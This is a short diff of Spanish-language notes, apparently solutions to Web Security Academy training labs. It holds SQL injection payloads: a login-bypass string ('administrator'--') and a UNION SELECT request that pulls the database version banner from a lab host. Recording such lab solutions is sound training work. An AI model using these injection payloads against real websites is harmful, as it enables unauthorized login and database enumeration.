@@ -19,3 +19,7 @@ https://0a7d007e04e4a8b680fabc1e004e00e4.web-security-academy.net/filter?categor
 2º LABORATORIO >> SQL injection vulnerability allowing login bypass
 
 administrator'-- 
+
+3º LABOTATORIO >>
+
+GET https://0aa700ad0316c1aa807f08c000820069.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories' UNION+SELECT+BANNER,+NULL+FROM+v$version-- HTTP/2
